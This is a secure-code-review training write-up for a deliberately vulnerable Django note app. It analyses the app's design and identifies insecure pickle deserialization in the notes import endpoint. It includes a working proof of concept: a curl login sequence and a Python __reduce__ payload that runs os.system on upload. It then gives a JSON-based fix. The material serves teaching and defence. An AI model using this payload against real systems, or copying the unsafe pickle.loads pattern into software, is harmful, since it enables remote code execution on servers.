# Secure Code Review — Challenge #5: Notekeeper — Solution

<table>
<tr>
<td width="100%">

<!-- TODO: YouTube walkthrough — replace VIDEO_ID once recorded/published -->
<a href="https://youtu.be/VIDEO_ID">
  <img src="https://img.youtube.com/vi/VIDEO_ID/hqdefault.jpg" align="right" width="240" alt="Watch the walkthrough">
</a>

### 🎥 This solution is explained in detail on my YouTube Channel <img src="../../assets/AppSec_Untangled_Logo.jpg" width="30"> [AppSec Untangled](https://www.youtube.com/@AppSecUntangled)

Full walkthrough of the review process, the finding, and the fix.

[![Watch on YouTube](https://img.shields.io/badge/▶_Watch_the_walkthrough-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtu.be/VIDEO_ID)

<!-- TODO: replace the badge link above with the real video URL when published -->

</td>
</tr>
</table>

---

# Part I: Review Steps

*The methodology followed to build a mental model of the system before looking for the flaw. It
mirrors the [suggested methodology](../../README.md#suggested-methodology): scope → entry points →
sinks → threat model → mitigation review.*

## 1. 🗺️ Application scope & architecture

Notekeeper is a personal note manager: users sign in, create/edit/delete their own notes, and can
**export** all their notes to a file and **import** them back. Two walkthroughs build the mental model
a review needs: **what happens when the app starts** (the wiring) and **what happens when a user signs
in and uses it** (the request flow). Libraries are linked where they first do their job.

### 🚀 What happens when the app starts

**1. `docker compose up` → [`docker-compose.yml`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/docker-compose.yml).** It declares **two containers**: a stock `postgres:16` image (black-box data store) and an `app` container **built locally** — so the code to review is ours.

```yaml
services:
  db:                 # stock postgres image — data store
    image: postgres:16
  app:
    build: .          # ← built from the local Dockerfile; this is our code
```

**2. `build: .` → [`Dockerfile`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/Dockerfile).** A `python:3.12-slim` image that installs the requirements and runs [`entrypoint.sh`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/entrypoint.sh) as a non-root `appuser`.

**3. [`entrypoint.sh`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/entrypoint.sh#L12) applies migrations, seeds a `demo` and an `admin` account, then starts the Django dev server:**

```sh
python manage.py migrate --noinput
# ... seed demo/admin ...
exec python manage.py runserver 0.0.0.0:8000   # entrypoint.sh#L34
```

**4. The framework is [Django 5.2](https://docs.djangoproject.com/en/5.2/) ([`requirements.txt`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/requirements.txt)).** [`notekeeper/settings.py`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notekeeper/settings.py#L47) wires the **global middleware** — several are security controls that matter for the threat model:

```python
MIDDLEWARE = [
    'django.contrib.sessions.middleware.SessionMiddleware',      # cookie sessions
    'django.middleware.csrf.CsrfViewMiddleware',                 # CSRF protection  (settings.py#L51)
    'django.contrib.auth.middleware.AuthenticationMiddleware',   # request.user     (settings.py#L52)
    ...
]
```

- [`SessionMiddleware`](https://docs.djangoproject.com/en/5.2/topics/http/sessions/) + [`AuthenticationMiddleware`](https://docs.djangoproject.com/en/5.2/ref/middleware/#django.contrib.auth.middleware.AuthenticationMiddleware) give every request a `request.user`.
- [`CsrfViewMiddleware`](https://docs.djangoproject.com/en/5.2/ref/csrf/) enforces a CSRF token on unsafe methods.

**5. Routes are mapped in [`notekeeper/urls.py`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notekeeper/urls.py):** Django auth login, a custom signup/logout, the notes CRUD endpoints, and the import/export pair — all handled by [`notes/views.py`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py).

**6. The data store is PostgreSQL via the [Django ORM](https://docs.djangoproject.com/en/5.2/topics/db/queries/)** ([`settings.py#L76`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notekeeper/settings.py#L76)). The only model is [`Note`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/models.py) — a `user` FK plus `title`/`content`.

**7. There is no external binary or network egress** — no converter, no headless browser, no outbound HTTP. The one non-obvious "engine" in play is a Python **standard-library** module, introduced in the request flow below.

### 🔄 What happens for the main use cases

- **Sign in.** `GET/POST /accounts/login/` uses Django's built-in [`LoginView`](https://docs.djangoproject.com/en/5.2/topics/auth/default/#django.contrib.auth.views.LoginView); `signup` ([`views.py#L11`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L11)) uses [`UserCreationForm`](https://docs.djangoproject.com/en/5.2/topics/auth/default/#django.contrib.auth.forms.UserCreationForm). Every notes view is guarded by [`@login_required`](https://docs.djangoproject.com/en/5.2/topics/auth/default/#the-login-required-decorator).

- **Read / create / edit / delete notes.** `notes_home` ([`views.py#L29`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L29)) renders only the caller's notes; `create_note`/`update_note`/`delete_note`/`get_note` all scope by `user=request.user` and fetch single objects with [`get_object_or_404(Note, id=..., user=request.user)`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L53) — note the **ownership check is baked into the lookup**.

- **Export notes.** `export_notes` ([`views.py#L76`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L76)) serializes the user's notes and returns them base64-encoded:

  ```python
  serialized = pickle.dumps(list(notes.values()))
  return HttpResponse(base64.b64encode(serialized), content_type='text/plain')
  ```

- **Import notes.** `import_notes` ([`views.py#L83`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L83)) takes that file back and **reverses the process**:

  ```python
  data = base64.b64decode(request.FILES['import_file'].read())
  notes_data = pickle.loads(data)                     # views.py#L87
  for note_data in notes_data:
      Note.objects.create(user=request.user, title=note_data['title'], content=note_data['content'])
  ```

The asymmetry worth noticing (without judging it yet): the export/import round-trip is implemented with Python's [`pickle`](https://docs.python.org/3/library/pickle.html) module, and the imported bytes come straight from an **uploaded file**.

## 2. 🚪 Entry points

All notes routes require an authenticated session ([`@login_required`](https://docs.djangoproject.com/en/5.2/topics/auth/default/#the-login-required-decorator)); registration is open.

- `GET/POST /accounts/login/` — *auth:* none — username/password ([`urls.py#L17`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notekeeper/urls.py#L17))
- `GET/POST /accounts/signup/` — *auth:* none — new username/password ([`views.py#L11`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L11))
- `GET /` — *auth:* user — none (renders own notes) ([`views.py#L29`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L29))
- `POST /create_note/` — *auth:* user — `title`, `content` ([`views.py#L35`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L35))
- `GET /get_note/<id>/`, `POST /update_note/<id>/`, `POST /delete_note/<id>/` — *auth:* user — `id` path param, `title`/`content` ([`views.py#L52`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L52))
- `GET /export_notes/` — *auth:* user — none ([`views.py#L76`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L76))
- **`POST /import_notes/` — *auth:* user — an uploaded file (`import_file`)** ([`views.py#L83`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L83))

## 3. 🎯 Dangerous sinks (code & dependencies)

- **S1 — `pickle.loads(data)` on uploaded bytes** → **insecure deserialization / RCE**. Fed from `request.FILES['import_file']`. [`views.py#L87`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L87)
- **S2 — template rendering of `note.title` / `note.content`** → stored XSS *if* unescaped. [`notes.html#L71`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/templates/notes.html#L71)
- **S3 — ORM lookups built from the `<id>` path param and form fields** → SQL injection *if* raw. [`views.py#L53`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L53)

## 4 & 5. 🧩 Threat model & 🔍 mitigation review

*The candidate options for this app are exactly the classic five (deserialization, XSS, SQL/NoSQL
injection, broken authentication/authorization, CSRF). I checked each against the code.*

### 🔓 Business-logic vulnerabilities

- **Broken authentication → ✅ mitigated.** Every notes view carries [`@login_required`](https://docs.djangoproject.com/en/5.2/topics/auth/default/#the-login-required-decorator) ([`views.py#L28,34,45,51,57,68,75,82`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L28)); an anonymous request is redirected to login. Sessions/passwords use Django's stock auth.

- **Broken authorization / IDOR → ✅ mitigated.** Every query is scoped to the caller: list/home use `Note.objects.filter(user=request.user)`, and single-object routes use `get_object_or_404(Note, id=note_id, user=request.user)` ([`views.py#L53`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L53)) — the `user=` clause makes another user's ID resolve to **404**, not their note. Import creates notes owned by `request.user` only. No cross-tenant access.

- **CSRF on mutating calls → ✅ mitigated.** [`CsrfViewMiddleware`](https://docs.djangoproject.com/en/5.2/ref/csrf/) is enabled globally ([`settings.py#L51`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notekeeper/settings.py#L51)); every form (including **Import Notes**) emits `{% csrf_token %}` and the `fetch()` calls send the `X-CSRFToken` header ([`notes.html#L27`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/templates/notes.html#L27)). A forged cross-site POST is rejected with 403.

### 💉 Source-to-sink (injection) vulnerabilities

- **S2 — Stored XSS → ✅ mitigated.** Django templates [auto-escape](https://docs.djangoproject.com/en/5.2/ref/templates/language/#automatic-html-escaping) by default. `{{ note.title }}`/`{{ note.content }}` are HTML-escaped, and the JS handlers use the [`escapejs`](https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#escapejs) filter ([`notes.html#L74`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/templates/notes.html#L74)). No `|safe`, `mark_safe`, or `autoescape off`. A `<script>` note renders inert.

- **S3 — SQL injection → ✅ mitigated.** All DB access goes through the [Django ORM](https://docs.djangoproject.com/en/5.2/topics/security/#sql-injection-protection), which parameterizes queries; there is no `raw()`, `.extra()`, or cursor SQL. (And it's PostgreSQL, not Mongo — "NoSQL injection" doesn't apply.)

- **S1 — Insecure deserialization → ❌ NOT mitigated. This is the finding.** `import_notes` calls `pickle.loads()` on bytes taken directly from an uploaded file ([`views.py#L86-L87`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L86)). Python's own docs warn, in a red box: *"The `pickle` module **is not secure**. Only unpickle data you trust… it is possible to construct malicious pickle data which will **execute arbitrary code** during unpickling."* ([pickle docs](https://docs.python.org/3/library/pickle.html)). There is no signing, no allow-listed classes, no `RestrictedUnpickler`. The `.json,.csv,.txt` `accept=` attribute on the file input ([`notes.html#L29`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/templates/notes.html#L29)) is **client-side only** and enforces nothing server-side.

**🔦 Tools can help find the sink, too.** You don't have to spot this only by eye — a generic SAST pass flags it directly. Running [Semgrep](https://semgrep.dev/) over the whole app with its default rules:

```bash
semgrep --config auto .
```

surfaces it as a blocking finding (snippet of the output):

```
notes/views.py
   ❯❯❱ python.django.security.audit.avoid-insecure-deserialization.avoid-insecure-deserialization
         Avoid using insecure deserialization library, backed by `pickle`, `_pickle`, `cpickle`,
         `dill`, `shelve`, or `yaml`, which are known to lead to remote code execution
         vulnerabilities.
         Details: https://sg.run/9oyr
          87┆ notes_data = pickle.loads(data)
```

SAST is good at locating a **dangerous sink** (a `pickle.loads`, an `eval`, a raw SQL string). What it *can't* decide for you is whether the input is genuinely attacker-controlled and whether anything upstream neutralizes it — that source→sink reachability call (§6) is still the reviewer's. Contrast this with the missing-authorization / IDOR class of bug, which has no telltale sink and which no scanner flags at all.

---

# Part II: Solution

## 6. 🧪 The vulnerability & exploitation

- **Class:** Insecure Deserialization → Remote Code Execution — [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html) (OWASP **A08:2021 – Software and Data Integrity Failures**).
- **Root cause:** untrusted, attacker-supplied bytes passed to `pickle.loads()` — [`notes/views.py#L87`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L87).
- **Sink:** `pickle.loads(data)` in `import_notes` — [`notes/views.py#L83-L97`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/005-notekeeper/notes/views.py#L83).

### 🧠 Why it works

`pickle` is not a data format — it is a mini **stack language** for reconstructing Python objects, and part of that language is *calling things*. When an object defines [`__reduce__`](https://docs.python.org/3/library/pickle.html#object.__reduce__), unpickling calls the callable it returns with the arguments it returns. An attacker therefore ships an object whose `__reduce__` returns `(os.system, ("<cmd>",))`; the command runs **the instant `pickle.loads()` parses the stream** — before any of the surrounding code (the `for` loop, the `note_data['title']` access) executes.

That ordering explains a detail seen during exploitation: the request still returns a JSON **error** (`'int' object is not iterable`), because after `os.system` runs it returns an exit code (`0`), `pickle` hands that back as the "deserialized object," and the `for note_data in 0:` loop then raises. **The error is cosmetic — the command has already executed.** The `try/except` around the loop provides *no* protection, since the dangerous work happens inside `pickle.loads()` itself.

The app even hands attackers the exact wire format: `GET /export_notes/` shows that an import file is `base64(pickle_bytes)`, so no reverse-engineering is needed.

### 🚀 Exploitation steps / PoC

Authenticate as any user (registration is open), then craft and upload a malicious pickle.

```bash
# 0) Log in as the seeded demo user, keeping cookies + CSRF token
curl -s -c cj.txt http://localhost:8000/accounts/login/ -o login.html
CSRF=$(grep csrfmiddlewaretoken login.html | sed -E 's/.*value="([^"]+)".*/\1/' | head -1)
curl -s -b cj.txt -c cj.txt http://localhost:8000/accounts/login/ \
  -H "Referer: http://localhost:8000/accounts/login/" \
  -d "csrfmiddlewaretoken=$CSRF&username=demo&password=demo12345&next=/" -o /dev/null

# 1) Build the payload: __reduce__ makes unpickling call os.system(...)
python3 - <<'PY'
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned_by_pickle.txt; echo RCE-OK',))
open('exploit.txt','wb').write(base64.b64encode(pickle.dumps(Exploit())))
PY

# 2) Upload it through the Import Notes endpoint
CSRFCOOKIE=$(grep csrftoken cj.txt | awk '{print $7}')
curl -s -b cj.txt http://localhost:8000/import_notes/ \
  -H "X-CSRFToken: $CSRFCOOKIE" -H "Referer: http://localhost:8000/" \
  -F "csrfmiddlewaretoken=$CSRFCOOKIE" -F "import_file=@exploit.txt"
```

Observed responses / proof:

```
# import response (command already ran; the error is the loop choking on os.system's int return)
{"status": "error", "message": "'int' object is not iterable"}   HTTP 400

# proof the command executed INSIDE the app container:
$ docker exec notekeeper_app sh -c 'cat /tmp/pwned_by_pickle.txt'
uid=1001(appuser) gid=1001(appuser) groups=1001(appuser)
```

Control (benign round-trip) for contrast: exporting real notes (`GET /export_notes/`) and re-importing that file succeeds with `{"status": "success"}` and recreates the notes — same endpoint, safe payload.

> ✅ **Verified:** Ran end-to-end against the Docker Compose stack this session. A crafted pickle uploaded to `POST /import_notes/` executed `os.system` during `pickle.loads()`, writing `/tmp/pwned_by_pickle.txt` with the container process's `id` output — arbitrary command execution as `appuser`.

**Impact:** Any authenticated user (and registration is open, so effectively any attacker) achieves **remote code execution** on the application server — full read/write of the app's data and secrets, lateral movement to the PostgreSQL container over the compose network, and a foothold for persistence. This is a complete compromise of the app tier, gated only by a trivially obtainable login.

## 7. 🛠️ Suggested fix

**Primary fix — never deserialize untrusted input with `pickle`. Use a data-only format (JSON).** Export and import notes as JSON, which cannot instantiate arbitrary objects or call code:

```python
import json

@login_required
def export_notes(request):
    notes = Note.objects.filter(user=request.user).values('title', 'content')
    return JsonResponse(list(notes), safe=False)

@login_required
def import_notes(request):
    if request.method != 'POST':
        return JsonResponse({'status': 'error'}, status=400)
    try:
        notes_data = json.loads(request.FILES['import_file'].read().decode('utf-8'))
        for nd in notes_data:                     # validate shape/length before trusting it
            Note.objects.create(user=request.user,
                                 title=str(nd['title'])[:100],
                                 content=str(nd['content']))
        return JsonResponse({'status': 'success'})
    except (ValueError, KeyError, TypeError) as e:
        return JsonResponse({'status': 'error', 'message': str(e)}, status=400)
```

**Defense-in-depth (do these too — never rely on a single control):**

1. **Validate on the server**, not just the `accept=` attribute: enforce content type, size limits, and a strict schema on the parsed data.
2. **If a non-JSON binary interchange is truly required**, sign exported blobs (e.g. Django's [`signing`](https://docs.djangoproject.com/en/5.2/topics/signing/) / HMAC) and verify the signature before parsing — so only data the server itself produced is accepted. `pickle` remains unsafe even then; prefer a schema-bound format.
3. **Least privilege / blast-radius:** the app already runs as non-root — keep it that way, restrict the DB user's grants, and lock down egress from the app container so an RCE can't pivot freely.
4. **Static analysis in CI:** flag `pickle.loads`/`yaml.load`/`marshal` on request-derived data ([Bandit `B301/B403`](https://bandit.readthedocs.io/en/latest/plugins/b301_pickle.html)).

## 8. 🌍 Real-world grounding & resources

- **The lesson:** *deserialization is code execution in disguise.* Formats like `pickle` (Python), Java native serialization, Ruby `Marshal`, and PHP `unserialize` reconstruct objects by **invoking constructors/callables**, so feeding them untrusted bytes is equivalent to running attacker code. The fix is categorical: use data-only formats (JSON) for anything crossing a trust boundary.
- **CWE:** [CWE-502 – Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html); OWASP Top 10 [A08:2021 – Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/).
- **Authoritative docs / guidance:** [Python `pickle` — security warning](https://docs.python.org/3/library/pickle.html) · [OWASP – Deserialization of untrusted data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data) · [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
- **Hands-on:** [PortSwigger Web Security Academy — Insecure deserialization](https://portswigger.net/web-security/deserialization).
- **Real-world CVE:** [CVE-2024-2912 — BentoML](https://nvd.nist.gov/vuln/detail/CVE-2024-2912): insecure deserialization of untrusted input led to remote code execution in a widely used AI model-serving framework — the same `pickle`-style root cause as this challenge.

**Takeaway:** When you see `pickle.loads`, `yaml.load` (unsafe loader), `marshal`, or any native-deserialize call sitting on the path from user input, treat it as an RCE sink until proven otherwise — and the fix is almost never "wrap it in try/except," it's "don't deserialize untrusted data with that mechanism at all."
